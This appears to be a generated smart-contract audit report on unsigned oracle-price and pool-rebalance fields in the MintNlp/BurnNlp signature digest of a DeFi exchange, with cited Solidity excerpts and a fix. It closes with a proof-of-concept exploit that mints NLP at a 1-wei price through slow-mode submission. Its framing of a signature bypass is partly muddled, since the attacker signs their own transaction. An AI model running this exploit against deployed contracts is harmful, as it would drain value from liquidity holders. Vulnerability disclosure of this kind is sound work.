### Title
Unsigned `oraclePriceX18` and `nlpPoolRebalanceX18` in `MintNlp`/`BurnNlp` Digest Allows Attacker to Mint or Burn NLP at Manipulated Price — (File: `core/contracts/Verifier.sol`)

---

### Summary

The EIP-712 digest computed for `MintNlp` and `BurnNlp` transactions commits only to `sender`, `quoteAmount`/`nlpAmount`, and `nonce`. The execution-critical fields `oraclePriceX18` and `nlpPoolRebalanceX18` are absent from the digest. Because these fields sit at fixed ABI-head positions in the encoded struct, an attacker can sign a transaction with benign values, then submit the same transaction bytes with those fields overwritten to attacker-chosen values. The signature remains valid; the manipulated price and rebalance array are silently accepted and executed.

---

### Finding Description

`Verifier.computeDigest` for `MintNlp` produces:

```solidity
digest = keccak256(abi.encode(
    keccak256(bytes(MINT_NLP_SIGNATURE)),
    signedTx.tx.sender,
    signedTx.tx.quoteAmount,
    signedTx.tx.nonce
));
``` [1](#0-0) 

The same omission applies to `BurnNlp`:

```solidity
digest = keccak256(abi.encode(
    keccak256(bytes(BURN_NLP_SIGNATURE)),
    signedTx.tx.sender,
    signedTx.tx.nlpAmount,
    signedTx.tx.nonce
));
``` [2](#0-1) 

Yet `processTransactionImpl` passes both omitted fields directly to the clearinghouse:

```solidity
priceX18[NLP_PRODUCT_ID] = signedTx.oraclePriceX18;
clearinghouse.mintNlp(
    signedTx.tx,
    signedTx.oraclePriceX18,
    nlpPools,
    signedTx.nlpPoolRebalanceX18
);
``` [3](#0-2) 

The struct `SignedMintNlp` is:

```solidity
struct SignedMintNlp {
    MintNlp tx;                      // static head: words 0-2
    bytes signature;                 // dynamic: offset at word 3
    int128 oraclePriceX18;           // static head: word 4
    int128[] nlpPoolRebalanceX18;    // dynamic: offset at word 5
}
``` [4](#0-3) 

Because `oraclePriceX18` is a static field at a fixed ABI head position (word 4), it can be freely overwritten in the raw bytes without disturbing the static fields that the digest covers (words 0–2). The `bytes signature` field is at a dynamic offset (word 3); its content is unchanged, so `ECDSA.recover` still returns the correct signer. The attacker's signature is therefore valid over the manipulated transaction.

The entry path is `submitSlowModeTransaction`, which is open to any unprivileged caller:

```solidity
function submitSlowModeTransaction(bytes calldata transaction)
    external
    virtual
{
    _delegatecallEndpointTx(
        abi.encodeWithSelector(
            EndpointTx.submitSlowModeTransactionImpl.selector,
            transaction
        )
    );
}
``` [5](#0-4) 

`submitSlowModeTransactionImpl` does not restrict `MintNlp` or `BurnNlp` to the owner; it falls into the generic `else` branch that only charges a slow-mode fee: [6](#0-5) 

After the 3-day `SLOW_MODE_TX_DELAY`, the attacker can execute the stored transaction themselves without sequencer cooperation:

```solidity
require(
    fromSequencer || (txn.executableAt <= block.timestamp),
    ERR_SLOW_TX_TOO_RECENT
);
``` [7](#0-6) 

---

### Impact Explanation

An attacker who controls a subaccount can:

1. **Mint NLP at a depressed price**: set `oraclePriceX18` to a very small value so that a given `quoteAmount` yields far more NLP tokens than the true oracle price would allow, extracting value from existing NLP holders.
2. **Burn NLP at an inflated price**: set `oraclePriceX18` to a very large value so that burning a small `nlpAmount` returns an outsized quote balance.
3. **Corrupt NLP pool rebalance**: supply an arbitrary `nlpPoolRebalanceX18` array to shift balances across NLP pools in ways that were never authorized by the signer.

The corrupted state delta is: `priceX18[NLP_PRODUCT_ID]` is overwritten with the attacker-chosen value, and NLP token balances and pool balances are updated at that price.

---

### Likelihood Explanation

- The attacker only needs a funded subaccount and the ability to call `submitSlowModeTransaction`.
- No privileged role, sequencer key, or social engineering is required.
- The 3-day slow-mode window is a delay, not a barrier; the attacker executes the transaction themselves after the timeout.
- The manipulation is invisible to the sequencer's off-chain checks because the on-chain signature verification passes.

---

### Recommendation

Include `oraclePriceX18` and `nlpPoolRebalanceX18` in the EIP-712 digest for both `MintNlp` and `BurnNlp`:

```solidity
// MintNlp
digest = keccak256(abi.encode(
    keccak256(bytes(MINT_NLP_SIGNATURE)),
    signedTx.tx.sender,
    signedTx.tx.quoteAmount,
    signedTx.tx.nonce,
    signedTx.oraclePriceX18,           // add
    keccak256(abi.encodePacked(signedTx.nlpPoolRebalanceX18)) // add
));
```

This mirrors the fix recommended in the LiFi report: force the signed data to cover all fields that affect execution, making any post-signing modification detectable.

---

### Proof of Concept

```solidity
// Attacker signs a legitimate MintNlp transaction
bytes32 sender = ...; // attacker's subaccount
uint128 quoteAmount = 1000e18;
uint64 nonce = 0;
int128 legitimatePrice = 1e18; // true oracle price

// Attacker signs digest over (sender, quoteAmount, nonce) only
bytes memory sig = sign(MINT_NLP_SIGNATURE, sender, quoteAmount, nonce);

// Attacker crafts transaction bytes:
// - words 0-2: sender, quoteAmount, nonce  (covered by digest)
// - word 3:    offset to signature bytes   (unchanged)
// - word 4:    oraclePriceX18 = 1          (NOT covered by digest — manipulated)
// - word 5:    offset to nlpPoolRebalanceX18 (manipulated array)
int128 manipulatedPrice = 1; // 1 wei — NLP is "free"

bytes memory transaction = abi.encodePacked(
    uint8(IEndpoint.TransactionType.MintNlp),
    abi.encode(IEndpoint.SignedMintNlp({
        tx: IEndpoint.MintNlp(sender, quoteAmount, nonce),
        signature: sig,
        oraclePriceX18: manipulatedPrice,  // overwritten
        nlpPoolRebalanceX18: new int128[](0)
    }))
);

// Submit via slow mode — signature check passes because digest
// only covers (sender, quoteAmount, nonce)
endpoint.submitSlowModeTransaction(transaction);

// After 3 days, execute — attacker receives NLP at price=1 instead of 1e18
endpoint.executeSlowModeTransaction(false);
```

The `ECDSA.recover` call in `validateSignature` returns the attacker's address because the digest was computed only over the three committed fields; `oraclePriceX18 = 1` is never hashed. [8](#0-7)

### Citations

**File:** core/contracts/Verifier.sol (L291-304)
```text
    function validateSignature(
        bytes32 sender,
        address linkedSigner,
        bytes32 digest,
        bytes memory signature
    ) public pure {
        address recovered = ECDSA.recover(digest, signature);
        require(
            (recovered != address(0)) &&
                ((recovered == address(uint160(bytes20(sender)))) ||
                    (recovered == linkedSigner)),
            ERR_INVALID_SIGNATURE
        );
    }
```

**File:** core/contracts/Verifier.sol (L373-385)
```text
        } else if (txType == IEndpoint.TransactionType.MintNlp) {
            IEndpoint.SignedMintNlp memory signedTx = abi.decode(
                transactionBody,
                (IEndpoint.SignedMintNlp)
            );
            digest = keccak256(
                abi.encode(
                    keccak256(bytes(MINT_NLP_SIGNATURE)),
                    signedTx.tx.sender,
                    signedTx.tx.quoteAmount,
                    signedTx.tx.nonce
                )
            );
```

**File:** core/contracts/Verifier.sol (L386-398)
```text
        } else if (txType == IEndpoint.TransactionType.BurnNlp) {
            IEndpoint.SignedBurnNlp memory signedTx = abi.decode(
                transactionBody,
                (IEndpoint.SignedBurnNlp)
            );
            digest = keccak256(
                abi.encode(
                    keccak256(bytes(BURN_NLP_SIGNATURE)),
                    signedTx.tx.sender,
                    signedTx.tx.nlpAmount,
                    signedTx.tx.nonce
                )
            );
```

**File:** core/contracts/EndpointTx.sol (L355-385)
```text
        } else if (
            txType == IEndpoint.TransactionType.WithdrawInsurance ||
            txType == IEndpoint.TransactionType.DelistProduct ||
            txType == IEndpoint.TransactionType.DumpFees ||
            txType == IEndpoint.TransactionType.RebalanceXWithdraw ||
            txType == IEndpoint.TransactionType.UpdateTierFeeRates ||
            txType == IEndpoint.TransactionType.AddNlpPool ||
            txType == IEndpoint.TransactionType.UpdateNlpPool ||
            txType == IEndpoint.TransactionType.DeleteNlpPool ||
            txType == IEndpoint.TransactionType.ForceRebalanceNlpPool ||
            txType == IEndpoint.TransactionType.NlpProfitShare ||
            txType == IEndpoint.TransactionType.UpdateBuilder
        ) {
            require(sender == owner());
        } else {
            chargeSlowModeFee(_getQuote(), sender);
            slowModeFees += SLOW_MODE_FEE;
        }

        IEndpoint.SlowModeConfig memory _slowModeConfig = slowModeConfig;
        requireUnsanctioned(sender);
        slowModeTxs[_slowModeConfig.txCount++] = IEndpoint.SlowModeTx({
            executableAt: uint64(block.timestamp) + SLOW_MODE_TX_DELAY, // hardcoded to three days
            sender: sender,
            tx: transaction
        });
        // TODO: to save on costs we could potentially just emit something
        // for now, we can just create a separate loop in the engine that queries the remote
        // sequencer for slow mode transactions, and ignore the possibility of a reorgy attack
        slowModeConfig = _slowModeConfig;
    }
```

**File:** core/contracts/EndpointTx.sol (L547-553)
```text
            priceX18[NLP_PRODUCT_ID] = signedTx.oraclePriceX18;
            clearinghouse.mintNlp(
                signedTx.tx,
                signedTx.oraclePriceX18,
                nlpPools,
                signedTx.nlpPoolRebalanceX18
            );
```

**File:** core/contracts/interfaces/IEndpoint.sol (L118-123)
```text
    struct SignedMintNlp {
        MintNlp tx;
        bytes signature;
        int128 oraclePriceX18;
        int128[] nlpPoolRebalanceX18;
    }
```

**File:** core/contracts/Endpoint.sol (L173-183)
```text
    function submitSlowModeTransaction(bytes calldata transaction)
        external
        virtual
    {
        _delegatecallEndpointTx(
            abi.encodeWithSelector(
                EndpointTx.submitSlowModeTransactionImpl.selector,
                transaction
            )
        );
    }
```

**File:** core/contracts/Endpoint.sol (L196-199)
```text
        require(
            fromSequencer || (txn.executableAt <= block.timestamp),
            ERR_SLOW_TX_TOO_RECENT
        );
```
